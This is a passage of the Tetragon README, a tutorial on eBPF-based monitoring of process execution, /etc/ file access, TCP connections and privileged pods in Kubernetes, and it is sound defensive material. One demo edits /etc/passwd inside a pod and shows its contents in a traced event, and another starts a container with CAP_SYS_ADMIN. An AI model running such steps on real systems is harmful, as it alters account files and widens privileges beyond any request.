activity of a process&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;As a first step, let&#39;s start monitoring the events from the &lt;code&gt;xwing&lt;/code&gt; pod:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe --namespace default --pod xwing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then in another terminal, let&#39;s &lt;code&gt;kubectl exec&lt;/code&gt; into the &lt;code&gt;xwing&lt;/code&gt; pod and execute some example commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl exec -it xwing -- /bin/bash&#xA;whoami&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you observe, the output in the first terminal should be:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;🚀 process default/xwing /bin/bash&#xA;🚀 process default/xwing /usr/bin/whoami&#xA;💥 exit    default/xwing /usr/bin/whoami 0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here you can see the binary names along with its arguments, the pod info, and return codes. For a compact one line view of the events.&lt;/p&gt; &#xA;&lt;p&gt;For more details use the raw JSON events to get detailed information, you can stop the Tetragon CLI by &lt;code&gt;Crl-C&lt;/code&gt; and parse the &lt;code&gt;tetragon.log&lt;/code&gt; file by executing:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl logs -n kube-system ds/tetragon -c export-stdout -f | jq &#39;select(.process_exec.process.pod.name==&#34;xwing&#34; or .process_exit.process.pod.name==&#34;xwing&#34;)&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example &lt;code&gt;process_exec&lt;/code&gt; and &lt;code&gt;process_exit&lt;/code&gt; events can be:&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt; Process Exec Event &lt;/summary&gt; &#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;process_exec&#34;: {&#xA;    &#34;process&#34;: {&#xA;      &#34;exec_id&#34;: &#34;a2luZC1jb250cm9sLXBsYW5lOjExNDI4NjE1NjM2OTAxOjUxNTgz&#34;,&#xA;      &#34;pid&#34;: 51583,&#xA;      &#34;uid&#34;: 0,&#xA;      &#34;cwd&#34;: &#34;/&#34;,&#xA;      &#34;binary&#34;: &#34;/usr/bin/whoami&#34;,&#xA;      &#34;arguments&#34;: &#34;--version&#34;,&#xA;      &#34;flags&#34;: &#34;execve rootcwd clone&#34;,&#xA;      &#34;start_time&#34;: &#34;2022-05-11T12:54:45.615Z&#34;,&#xA;      &#34;auid&#34;: 4294967295,&#xA;      &#34;pod&#34;: {&#xA;        &#34;namespace&#34;: &#34;default&#34;,&#xA;        &#34;name&#34;: &#34;xwing&#34;,&#xA;        &#34;container&#34;: {&#xA;          &#34;id&#34;: &#34;containerd://1fb931d2f6e5e4cfdbaf30fdb8e2fdd81320bdb3047ded50120a4f82838209ce&#34;,&#xA;          &#34;name&#34;: &#34;spaceship&#34;,&#xA;          &#34;image&#34;: {&#xA;            &#34;id&#34;: &#34;docker.io/tgraf/netperf@sha256:8e86f744bfea165fd4ce68caa05abc96500f40130b857773186401926af7e9e6&#34;,&#xA;            &#34;name&#34;: &#34;docker.io/tgraf/netperf:latest&#34;&#xA;          },&#xA;          &#34;start_time&#34;: &#34;2022-05-11T10:07:33Z&#34;,&#xA;          &#34;pid&#34;: 50&#xA;        }&#xA;      },&#xA;      &#34;docker&#34;: &#34;1fb931d2f6e5e4cfdbaf30fdb8e2fdd&#34;,&#xA;      &#34;parent_exec_id&#34;: &#34;a2luZC1jb250cm9sLXBsYW5lOjkwNzkyMjU2MjMyNjk6NDM4NzI=&#34;,&#xA;      &#34;refcnt&#34;: 1&#xA;    },&#xA;    &#34;parent&#34;: {&#xA;      &#34;exec_id&#34;: &#34;a2luZC1jb250cm9sLXBsYW5lOjkwNzkyMjU2MjMyNjk6NDM4NzI=&#34;,&#xA;      &#34;pid&#34;: 43872,&#xA;      &#34;uid&#34;: 0,&#xA;      &#34;cwd&#34;: &#34;/&#34;,&#xA;      &#34;binary&#34;: &#34;/bin/bash&#34;,&#xA;      &#34;flags&#34;: &#34;execve rootcwd clone&#34;,&#xA;      &#34;start_time&#34;: &#34;2022-05-11T12:15:36.225Z&#34;,&#xA;      &#34;auid&#34;: 4294967295,&#xA;      &#34;pod&#34;: {&#xA;        &#34;namespace&#34;: &#34;default&#34;,&#xA;        &#34;name&#34;: &#34;xwing&#34;,&#xA;        &#34;container&#34;: {&#xA;          &#34;id&#34;: &#34;containerd://1fb931d2f6e5e4cfdbaf30fdb8e2fdd81320bdb3047ded50120a4f82838209ce&#34;,&#xA;          &#34;name&#34;: &#34;spaceship&#34;,&#xA;          &#34;image&#34;: {&#xA;            &#34;id&#34;: &#34;docker.io/tgraf/netperf@sha256:8e86f744bfea165fd4ce68caa05abc96500f40130b857773186401926af7e9e6&#34;,&#xA;            &#34;name&#34;: &#34;docker.io/tgraf/netperf:latest&#34;&#xA;          },&#xA;          &#34;start_time&#34;: &#34;2022-05-11T10:07:33Z&#34;,&#xA;          &#34;pid&#34;: 43&#xA;        }&#xA;      },&#xA;      &#34;docker&#34;: &#34;1fb931d2f6e5e4cfdbaf30fdb8e2fdd&#34;,&#xA;      &#34;parent_exec_id&#34;: &#34;a2luZC1jb250cm9sLXBsYW5lOjkwNzkxODU5NTMzOTk6NDM4NjE=&#34;,&#xA;      &#34;refcnt&#34;: 1&#xA;    }&#xA;  },&#xA;  &#34;node_name&#34;: &#34;kind-control-plane&#34;,&#xA;  &#34;time&#34;: &#34;2022-05-11T12:54:45.615Z&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt; Process Exit Event &lt;/summary&gt; &#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;process_exit&#34;: {&#xA;    &#34;process&#34;: {&#xA;      &#34;exec_id&#34;: &#34;a2luZC1jb250cm9sLXBsYW5lOjExNDI4NjE1NjM2OTAxOjUxNTgz&#34;,&#xA;      &#34;pid&#34;: 51583,&#xA;      &#34;uid&#34;: 0,&#xA;      &#34;cwd&#34;: &#34;/&#34;,&#xA;      &#34;binary&#34;: &#34;/usr/bin/whoami&#34;,&#xA;      &#34;arguments&#34;: &#34;--version&#34;,&#xA;      &#34;flags&#34;: &#34;execve rootcwd clone&#34;,&#xA;      &#34;start_time&#34;: &#34;2022-05-11T12:54:45.615Z&#34;,&#xA;      &#34;auid&#34;: 4294967295,&#xA;      &#34;pod&#34;: {&#xA;        &#34;namespace&#34;: &#34;default&#34;,&#xA;        &#34;name&#34;: &#34;xwing&#34;,&#xA;        &#34;container&#34;: {&#xA;          &#34;id&#34;: &#34;containerd://1fb931d2f6e5e4cfdbaf30fdb8e2fdd81320bdb3047ded50120a4f82838209ce&#34;,&#xA;          &#34;name&#34;: &#34;spaceship&#34;,&#xA;          &#34;image&#34;: {&#xA;            &#34;id&#34;: &#34;docker.io/tgraf/netperf@sha256:8e86f744bfea165fd4ce68caa05abc96500f40130b857773186401926af7e9e6&#34;,&#xA;            &#34;name&#34;: &#34;docker.io/tgraf/netperf:latest&#34;&#xA;          },&#xA;          &#34;start_time&#34;: &#34;2022-05-11T10:07:33Z&#34;,&#xA;          &#34;pid&#34;: 50&#xA;        }&#xA;      },&#xA;      &#34;docker&#34;: &#34;1fb931d2f6e5e4cfdbaf30fdb8e2fdd&#34;,&#xA;      &#34;parent_exec_id&#34;: &#34;a2luZC1jb250cm9sLXBsYW5lOjkwNzkyMjU2MjMyNjk6NDM4NzI=&#34;&#xA;    },&#xA;    &#34;parent&#34;: {&#xA;      &#34;exec_id&#34;: &#34;a2luZC1jb250cm9sLXBsYW5lOjkwNzkyMjU2MjMyNjk6NDM4NzI=&#34;,&#xA;      &#34;pid&#34;: 43872,&#xA;      &#34;uid&#34;: 0,&#xA;      &#34;cwd&#34;: &#34;/&#34;,&#xA;      &#34;binary&#34;: &#34;/bin/bash&#34;,&#xA;      &#34;flags&#34;: &#34;execve rootcwd clone&#34;,&#xA;      &#34;start_time&#34;: &#34;2022-05-11T12:15:36.225Z&#34;,&#xA;      &#34;auid&#34;: 4294967295,&#xA;      &#34;pod&#34;: {&#xA;        &#34;namespace&#34;: &#34;default&#34;,&#xA;        &#34;name&#34;: &#34;xwing&#34;,&#xA;        &#34;container&#34;: {&#xA;          &#34;id&#34;: &#34;containerd://1fb931d2f6e5e4cfdbaf30fdb8e2fdd81320bdb3047ded50120a4f82838209ce&#34;,&#xA;          &#34;name&#34;: &#34;spaceship&#34;,&#xA;          &#34;image&#34;: {&#xA;            &#34;id&#34;: &#34;docker.io/tgraf/netperf@sha256:8e86f744bfea165fd4ce68caa05abc96500f40130b857773186401926af7e9e6&#34;,&#xA;            &#34;name&#34;: &#34;docker.io/tgraf/netperf:latest&#34;&#xA;          },&#xA;          &#34;start_time&#34;: &#34;2022-05-11T10:07:33Z&#34;,&#xA;          &#34;pid&#34;: 43&#xA;        }&#xA;      },&#xA;      &#34;docker&#34;: &#34;1fb931d2f6e5e4cfdbaf30fdb8e2fdd&#34;,&#xA;      &#34;parent_exec_id&#34;: &#34;a2luZC1jb250cm9sLXBsYW5lOjkwNzkxODU5NTMzOTk6NDM4NjE=&#34;&#xA;    }&#xA;  },&#xA;  &#34;node_name&#34;: &#34;kind-control-plane&#34;,&#xA;  &#34;time&#34;: &#34;2022-05-11T12:54:45.616Z&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;p&gt;For the rest of the use cases we will use the Tetragon CLI to give the output.&lt;/p&gt; &#xA;&lt;h3&gt;File Access&lt;/h3&gt; &#xA;&lt;p&gt;The second use case is file access, which can be observed with the Tetragon &lt;code&gt;process_kprobe&lt;/code&gt; JSON events. By using kprobe hook points, these events are able to observe arbitrary kernel calls and file descriptors in the Linux kernel, giving you the ability to monitor every file a process opens, reads, writes, and closes throughout its lifecycle. To be able to observe arbitrary kernel calls, Tetragon can be extended with &lt;code&gt;TracingPolicies&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;TracingPolicy&lt;/code&gt; is a user-configurable Kubernetes custom resource definition (CRD) that allows users to trace arbitrary events in the kernel and define actions to take on a match. For bare metal or VM use cases without Kubernetes a YAML configuration file can be used.&lt;/p&gt; &#xA;&lt;p&gt;In this example, we can monitor if a process inside a Kubernetes workload performs an open, close, read or write in the &lt;code&gt;/etc/&lt;/code&gt; directory. The policy may further specify additional directories or specific files if needed.&lt;/p&gt; &#xA;&lt;p&gt;As a first step, let&#39;s apply the following &lt;code&gt;TracingPolicy&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl apply -f https://raw.githubusercontent.com/cilium/tetragon/main/crds/examples/sys_write_follow_fd_prefix.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;As a second step, let&#39;s start monitoring the events from the &lt;code&gt;xwing&lt;/code&gt; pod:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe --namespace default --pod xwing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In another terminal, &lt;code&gt;kubectl exec&lt;/code&gt; into the &lt;code&gt;xwing&lt;/code&gt; pod:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl exec -it xwing -- /bin/bash&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and edit the &lt;code&gt;/etc/passwd&lt;/code&gt; file:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;vi /etc/passwd&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you observe, the output in the first terminal should be:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;🚀 process default/xwing /usr/bin/vi /etc/passwd&#xA;📬 open    default/xwing /usr/bin/vi /etc/passwd&#xA;📚 read    default/xwing /usr/bin/vi /etc/passwd 1269 bytes&#xA;📪 close   default/xwing /usr/bin/vi /etc/passwd&#xA;📬 open    default/xwing /usr/bin/vi /etc/passwd&#xA;📝 write   default/xwing /usr/bin/vi /etc/passwd 1277 bytes&#xA;💥 exit    default/xwing /usr/bin/vi /etc/passwd 0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note, that open and close are only generated for &lt;code&gt;/etc/&lt;/code&gt; files because of eBPF in kernel filtering. The default CRD additionally filters events associated with the pod init process to filter init noise from pod start.&lt;/p&gt; &#xA;&lt;p&gt;Similarly to the previous example, reviewing the JSON events provides additional data. An example &lt;code&gt;process_kprobe&lt;/code&gt; event observing a write can be:&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt; Process Kprobe Event &lt;/summary&gt; &#xA; &lt;p&gt; &lt;/p&gt;&#xA; &lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;   &#34;process_kprobe&#34;:{&#xA;      &#34;process&#34;:{&#xA;         &#34;exec_id&#34;:&#34;a2luZC1jb250cm9sLXBsYW5lOjE1MDA0MzM3MDE1MDI6MTkxNjM=&#34;,&#xA;         &#34;pid&#34;:19163,&#xA;         &#34;uid&#34;:0,&#xA;         &#34;cwd&#34;:&#34;/&#34;,&#xA;         &#34;binary&#34;:&#34;/usr/bin/vi&#34;,&#xA;         &#34;arguments&#34;:&#34;/etc/passwd&#34;,&#xA;         &#34;flags&#34;:&#34;execve rootcwd clone&#34;,&#xA;         &#34;start_time&#34;:&#34;2022-05-26T22:05:13.894Z&#34;,&#xA;         &#34;auid&#34;:4294967295,&#xA;         &#34;pod&#34;:{&#xA;            &#34;namespace&#34;:&#34;default&#34;,&#xA;            &#34;name&#34;:&#34;xwing&#34;,&#xA;            &#34;container&#34;:{&#xA;               &#34;id&#34;:&#34;containerd://4b0df5a137260a6b95cbf6443bb2f4b0c9309e6ccb3d8afdbc3da8fff40c0778&#34;,&#xA;               &#34;name&#34;:&#34;spaceship&#34;,&#xA;               &#34;image&#34;:{&#xA;                  &#34;id&#34;:&#34;docker.io/tgraf/netperf@sha256:8e86f744bfea165fd4ce68caa05abc96500f40130b857773186401926af7e9e6&#34;,&#xA;                  &#34;name&#34;:&#34;docker.io/tgraf/netperf:latest&#34;&#xA;               },&#xA;               &#34;start_time&#34;:&#34;2022-05-26T21:58:11Z&#34;,&#xA;               &#34;pid&#34;:25&#xA;            }&#xA;         },&#xA;         &#34;docker&#34;:&#34;4b0df5a137260a6b95cbf6443bb2f4b&#34;,&#xA;         &#34;parent_exec_id&#34;:&#34;a2luZC1jb250cm9sLXBsYW5lOjEyMDQ1NTIzMTUwNjY6MTc1NDI=&#34;,&#xA;         &#34;refcnt&#34;:1&#xA;      },&#xA;      &#34;parent&#34;:{&#xA;&#xA;      },&#xA;      &#34;function_name&#34;:&#34;__x64_sys_write&#34;,&#xA;      &#34;args&#34;:[&#xA;         {&#xA;            &#34;file_arg&#34;:{&#xA;               &#34;path&#34;:&#34;/etc/passwd&#34;&#xA;            }&#xA;         },&#xA;         {&#xA;            &#34;bytes_arg&#34;:&#34;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoCm5hdGFsaWEKYmluOng6MToxOmJpbjovYmluOi9zYmluL25vbG9naW4KZGFlbW9uOng6MjoyOmRhZW1vbjovc2Jpbjovc2Jpbi9ub2xvZ2luCmFkbTp4OjM6NDphZG06L3Zhci9hZG06L3NiaW4vbm9sb2dpbgpscDp4OjQ6NzpscDovdmFyL3Nwb29sL2xwZDovc2Jpbi9ub2xvZ2luCnN5bmM6eDo1OjA6c3luYzovc2JpbjovYmluL3N5bmMKc2h1dGRvd246eDo2OjA6c2h1dGRvd246L3NiaW46L3NiaW4vc2h1dGRvd24KaGFsdDp4Ojc6MDpoYWx0Oi9zYmluOi9zYmluL2hhbHQKbWFpbDp4Ojg6MTI6bWFpbDovdmFyL3Nwb29sL21haWw6L3NiaW4vbm9sb2dpbgpuZXdzOng6OToxMzpuZXdzOi91c3IvbGliL25ld3M6L3NiaW4vbm9sb2dpbgp1dWNwOng6MTA6MTQ6dXVjcDovdmFyL3Nwb29sL3V1Y3BwdWJsaWM6L3NiaW4vbm9sb2dpbgpvcGVyYXRvcjp4OjExOjA6b3BlcmF0b3I6L3Jvb3Q6L2Jpbi9zaAptYW46eDoxMzoxNTptYW46L3Vzci9tYW46L3NiaW4vbm9sb2dpbgpwb3N0bWFzdGVyOng6MTQ6MTI6cG9zdG1hc3RlcjovdmFyL3Nwb29sL21haWw6L3NiaW4vbm9sb2dpbgpjcm9uOng6MTY6MTY6Y3JvbjovdmFyL3Nwb29sL2Nyb246L3NiaW4vbm9sb2dpbgpmdHA6eDoyMToyMTo6L3Zhci9saWIvZnRwOi9zYmluL25vbG9naW4Kc3NoZDp4OjIyOjIyOnNzaGQ6L2Rldi9udWxsOi9zYmluL25vbG9naW4KYXQ6eDoyNToyNTphdDovdmFyL3Nwb29sL2Nyb24vYXRqb2JzOi9zYmluL25vbG9naW4Kc3F1aWQ6eDozMTozMTpTcXVpZDovdmFyL2NhY2hlL3NxdWlkOi9zYmluL25vbG9naW4KeGZzOng6MzM6MzM6WCBGb250IFNlcnZlcjovZXRjL1gxMS9mczovc2Jpbi9ub2xvZ2luCmdhbWVzOng6MzU6MzU6Z2FtZXM6L3Vzci9nYW1lczovc2Jpbi9ub2xvZ2luCnBvc3RncmVzOng6NzA6NzA6Oi92YXIvbGliL3Bvc3RncmVzcWw6L2Jpbi9zaApudXQ6eDo4NDo4NDpudXQ6L3Zhci9zdGF0ZS9udXQ6L3NiaW4vbm9sb2dpbgpjeXJ1czp4Ojg1OjEyOjovdXNyL2N5cnVzOi9zYmluL25vbG9naW4KdnBvcG1haWw6eDo4OTo4OTo6L3Zhci92cG9wbWFpbDovc2Jpbi9ub2xvZ2luCm50cDp4OjEyMzoxMjM6TlRQOi92YXIvZW1wdHk6L3NiaW4vbm9sb2dpbgpzbW1zcDp4OjIwOToyMDk6c21tc3A6L3Zhci9zcG9vbC9tcXVldWU6L3NiaW4vbm9sb2dpbgpndWVzdDp4OjQwNToxMDA6Z3Vlc3Q6L2Rldi9udWxsOi9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi86L3NiaW4vbm9sb2dpbgo=&#34;&#xA;         },&#xA;         {&#xA;            &#34;size_arg&#34;:&#34;1277&#34;&#xA;         }&#xA;      ],&#xA;      &#34;action&#34;:&#34;KPROBE_ACTION_POST&#34;&#xA;   },&#xA;   &#34;node_name&#34;:&#34;kind-control-plane&#34;,&#xA;   &#34;time&#34;:&#34;2022-05-26T22:05:25.962Z&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;/p&gt;&#xA;&lt;/details&gt; &#xA;&lt;p&gt;In addition to the Kubernetes Identity and process metadata from exec events, &lt;code&gt;process_kprobe&lt;/code&gt; events contain the arguments of the observed system call. In the above case they are&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;path&lt;/code&gt;: the observed file path&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;bytes_arg&lt;/code&gt;: content of the observed file encoded in base64&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;size_arg&lt;/code&gt;: size of the observed file in bytes&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;To disable the &lt;code&gt;TracingPolicy&lt;/code&gt; run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl delete -f ./crds/examples/sys_write_follow_fd_prefix.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Network Observability&lt;/h3&gt; &#xA;&lt;p&gt;To view TCP connect events apply the example TCP connect &lt;code&gt;TracingPolicy&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl apply -f https://raw.githubusercontent.com/cilium/tetragon/main/crds/examples/tcp-connect.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To start monitoring events in the &lt;code&gt;xwing&lt;/code&gt; pod run the Tetragon CLI:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe --namespace default --pod xwing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In another terminal, start generate a TCP connection. Here we use curl.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl exec -it xwing -- curl http://cilium.io&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The output in the first terminal will capture the new connect and write,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;🚀 process default/xwing /usr/bin/curl http://cilium.io&#xA;🔌 connect default/xwing /usr/bin/curl tcp 10.244.0.6:34965 -&amp;gt; 104.198.14.52:80&#xA;📤 sendmsg default/xwing /usr/bin/curl tcp 10.244.0.6:34965 -&amp;gt; 104.198.14.52:80 bytes 73&#xA;🧹 close   default/xwing /usr/bin/curl tcp 10.244.0.6:34965 -&amp;gt; 104.198.14.52:80&#xA;💥 exit    default/xwing /usr/bin/curl http://cilium.io 0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To disable the TracingPolicy run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl delete -f ./crds/examples/tcp-connect.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Privileged Execution&lt;/h3&gt; &#xA;&lt;p&gt;Tetragon also provides the ability to check process capabilities and kernel namespaces.&lt;/p&gt; &#xA;&lt;p&gt;As a first step let&#39;s enable visibility to capability and namespace changes via the configmap by setting &lt;code&gt;enable-process-cred&lt;/code&gt; and &lt;code&gt;enable-process-ns&lt;/code&gt; from &lt;code&gt;false&lt;/code&gt; to &lt;code&gt;true&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl edit cm -n kube-system tetragon-config&#xA;# change &#34;enable-process-cred&#34; from &#34;false&#34; to &#34;true&#34;&#xA;# change &#34;enable-process-ns&#34; from &#34;false&#34; to &#34;true&#34;&#xA;# then save and exit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Restart the Tetragon daemonset:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;kubectl rollout restart -n kube-system ds/tetragon&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;As a second step, let&#39;s start monitoring the Security Observability events from the privileged &lt;code&gt;test-pod&lt;/code&gt; workload:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe --namespace default --pod test-pod&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In another terminal let&#39;s apply the privileged PodSpec:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl apply -f https://raw.githubusercontent.com/cilium/tetragon/main/testdata/specs/testpod.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you observe the output in the first terminal, you can see the container start with &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;🚀 process default/test-pod /bin/sleep 365d                🛑 CAP_SYS_ADMIN&#xA;🚀 process default/test-pod /usr/bin/jq -r .bundle         🛑 CAP_SYS_ADMIN&#xA;🚀 process default/test-pod /usr/bin/cp /kind/product_name /kind/product_uuid /run/containerd/io.containerd.runtime.v2.task/k8s.io/7c7e513cd4d506417bc9d97dd9af670d94d9e84161c8c8 fdc9fa3a678289a59/rootfs/ 🛑 CAP_SYS_ADMIN&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;BTF Requirement&lt;/h2&gt; &#xA;&lt;p&gt;Many common Linux distributions now ship with BTF enabled and do not require any extra work. To check if BTF is enabled on your Linux system, the standard location is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ls /sys/kernel/btf/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Otherwise Tetragon repository provides a &lt;a href=&#34;https://raw.githubusercontent.com/cilium/tetragon/main/Vagrantfile&#34;&gt;Vagrantfile&lt;/a&gt; that can be used to install a vagrant box for running Tetragon with BTF requirement. Other VM solutions work as well.&lt;/p&gt; &#xA;&lt;p&gt;To run with &lt;a href=&#34;https://learn.hashicorp.com/tutorials/vagrant/getting-started-index?in=vagrant/getting-started&#34;&gt;vagrant&lt;/a&gt; we provide a standard VagrantFile with the required components enabled. Simply run,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt; $ vagrant up&#xA; $ vagrant ssh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This should be sufficient to create a Kind cluster and run Tetragon. For more information on the vagrant builds, see the &lt;a href=&#34;https://raw.githubusercontent.com/cilium/tetragon/main/docs/contributing/development/README.md#local-development-in-vagrant-box&#34;&gt;Development Guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;FAQ&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;Q:&lt;/strong&gt; Can I install and use Tetragon in standalone mode (outside of k8s)?&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;A:&lt;/strong&gt; Yes! You can run &lt;code&gt;make&lt;/code&gt; to generate standalone binaries and run them directly. &lt;code&gt;make install&lt;/code&gt; will do the same thing and also install to your &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;strong&gt;Q:&lt;/strong&gt; CI is complaining about Go module vendoring, what do I do?&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;A:&lt;/strong&gt; You can run &lt;code&gt;make vendor&lt;/code&gt; then add and commit your changes.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;strong&gt;Q:&lt;/strong&gt; CI is complaining about a missing &#34;signed-off-by&#34; line. What do I do?&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;A:&lt;/strong&gt; You need to add a signed-off-by line to your commit messages. The easiest way to do this is with &lt;code&gt;git fetch origin/main &amp;amp;&amp;amp; git rebase --signoff origin/main&lt;/code&gt;. Then push your changes.&lt;/p&gt; &#xA;&lt;h1&gt;Additional Resources&lt;/h1&gt; &#xA;&lt;h3&gt;Conference talks&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=bohnofE_dvw&#34;&gt;Uncovering a Sophisticated Kubernetes Attack in Real-Time&lt;/a&gt; - Jed Salazar &amp;amp; Natália Réka Ivánkó, KubeCon EU, 2020&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.oreilly.com/library/view/infrastructure-ops/0636920625377/video335775.html&#34;&gt;Uncovering a Sophisticated Kubernetes Attack in Real Time Part II.&lt;/a&gt; - Jed Salazar &amp;amp; Natália Réka Ivánkó, O&#39;Reilly Superstream Series, Infrastructure &amp;amp; Ops, 2021&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=agN68U8x1go&#34;&gt;Keeping your cluster safe from attacks with eBPF&lt;/a&gt; - Jed Salazar &amp;amp; Natália Réka Ivánkó, eBPF Summit, 2021&lt;/p&gt; &#xA;&lt;h3&gt;Book&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://isovalent.com/ebpf-security/&#34;&gt;Security Observability with eBPF&lt;/a&gt; - Jed Salazar &amp;amp; Natália Réka Ivánkó, OReilly, 2022&lt;/p&gt; &#xA;&lt;h3&gt;Blog posts&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://isovalent.com/blog/post/2021-11-container-escape&#34;&gt;Detecting a Container Escape with Cilium and eBPF&lt;/a&gt; - Natália Réka Ivánkó, 2021&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://isovalent.com/blog/post/2021-12-log4shell&#34;&gt;Detecting and Blocking log4shell with Isovalent Cilium Enterprise&lt;/a&gt; - Jed Salazar, 2021&lt;/p&gt; &#xA;&lt;h3&gt;Hands-on lab&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://isovalent.com/labs/&#34;&gt;Security Observability with eBPF and Tetragon&lt;/a&gt; - Natália Réka Ivánkó, Roland Wolters, Raphaël Pinson&lt;/p&gt; &#xA;&lt;h1&gt;Community&lt;/h1&gt; &#xA;&lt;h2&gt;Slack&lt;/h2&gt; &#xA;&lt;p&gt;Join the Tetragon &lt;a 